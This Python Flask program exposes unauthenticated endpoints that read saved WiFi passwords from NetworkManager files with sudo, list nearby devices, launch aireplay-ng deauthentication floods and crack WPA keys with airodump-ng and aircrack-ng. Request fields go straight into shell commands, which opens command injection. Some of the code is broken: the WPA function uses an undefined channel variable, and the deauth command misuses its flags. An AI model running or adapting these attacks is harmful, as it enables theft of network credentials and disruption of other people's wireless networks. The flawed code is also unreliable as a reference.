from flask import Flask, request, jsonify
import subprocess
import re
import os
import json
import time
from scapy.all import *

app = Flask(__name__)

def run_command(command, shell=False):
    try:
        result = subprocess.run(command, shell=shell, capture_output=True, text=True, check=True)
        return result.stdout, result.stderr
    except subprocess.CalledProcessError as e:
        return None, str(e)

def get_wifi_credentials():
    try:
        stdout, stderr = run_command(["iwconfig"])
        if stderr:
            print(f"Error: {stderr}")
            return None
        networks = re.findall(r"ESSID:\"(.*?)\"", stdout)

        wifi_credentials = {}

        for network in networks:
            command = f"sudo grep -A 10 {network} /etc/NetworkManager/system-connections/"
            stdout, stderr = run_command(command, shell=True)
            if stderr:
                print(f"Error: {stderr}")
                continue
            if "psk=" in stdout:
                psk = re.search(r"psk=(.*?)\n", stdout).group(1)
                wifi_credentials[network] = psk
            elif "key-mgmt=WPA-PSK" in stdout:
                psk = re.search(r"psk=(.*?)\n", stdout).group(1)
                wifi_credentials[network] = psk

        return wifi_credentials

    except Exception as e:
        print(f"Unexpected error: {e}")
        return None

def get_connected_devices():
    try:
        stdout, stderr = run_command(["arp", "-a"])
        if stderr:
            print(f"Error: {stderr}")
            return None
        devices = {}

        for line in stdout.splitlines():
            match = re.search(r"(\S+)\s+(\S+)\s+(\S+)", line)
            if match:
                ip, mac, interface = match.groups()
                devices[mac] = ip

        return devices

    except Exception as e:
        print(f"Unexpected error: {e}")
        return None

def deauth_attack(target_bssid, channel):
    try:
        cmd = f"aireplay-ng --deauth 10 -a {target_bssid} -c FF:FF:FF:FF:FF:FF -e {target_bssid} -D --channel {channel} wlan0"
        stdout, stderr = run_command(cmd, shell=True)
        if stderr:
            print(f"Deauth attack failed: {stderr}")
            return False
        return True

    except Exception as e:
        print(f"Unexpected error: {e}")
        return False

def wpa_psk_attack(target_bssid, target_essid, wordlist_path):
    try:
        cmd = f"airodump-ng --bssid {target_bssid} --essid {target_essid} --channel {channel} --write capture wlan0"
        stdout, stderr = run_command(cmd, shell=True)
        if stderr:
            print(f"Capture failed: {stderr}")
            return False

        cmd = f"aircrack-ng -w {wordlist_path} -b {target_bssid} capture-01.cap"
        stdout, stderr = run_command(cmd, shell=True)
        if stderr:
            print(f"WPA PSK attack failed: {stderr}")
            return False

        return True

    except Exception as e:
        print(f"Unexpected error: {e}")
        return False

@app.route('/wifi/credentials', methods=['GET'])
def wifi_credentials():
    credentials = get_wifi_credentials()
    if credentials:
        return jsonify(credentials), 200
    else:
        return jsonify({"error": "Failed to retrieve WiFi credentials"}), 500

@app.route('/devices/connected', methods=['GET'])
def connected_devices():
    devices = get_connected_devices()
    if devices:
        return jsonify(devices), 200
    else:
        return jsonify({"error": "Failed to retrieve connected devices"}), 500

@app.route('/attack/deauth', methods=['POST'])
def deauth_attack_endpoint():
    data = request.json
    target_bssid = data.get('target_bssid')
    channel = data.get('channel')
    if not target_bssid or not channel:
        return jsonify({"error": "Missing target_bssid or channel"}), 400

    success = deauth_attack(target_bssid, channel)
    if success:
        return jsonify({"message": "Deauth attack initiated"}), 200
    else:
        return jsonify({"error": "Deauth attack failed"}), 500

@app.route('/attack/wpa_psk', methods=['POST'])
def wpa_psk_attack_endpoint():
    data = request.json
    target_bssid = data.get('target_bssid')
    target_essid = data.get('target_essid')
    wordlist_path = data.get('wordlist_path')
    if not target_bssid or not target_essid or not wordlist_path:
        return jsonify({"error": "Missing target_bssid, target_essid, or wordlist_path"}), 400

    success = wpa_psk_attack(target_bssid, target_essid, wordlist_path)
    if success:
        return jsonify({"message": "WPA PSK attack initiated"}), 200
    else:
        return jsonify({"error": "WPA PSK attack failed"}), 500

if __name__ == '__main__':
    app.run(debug=True)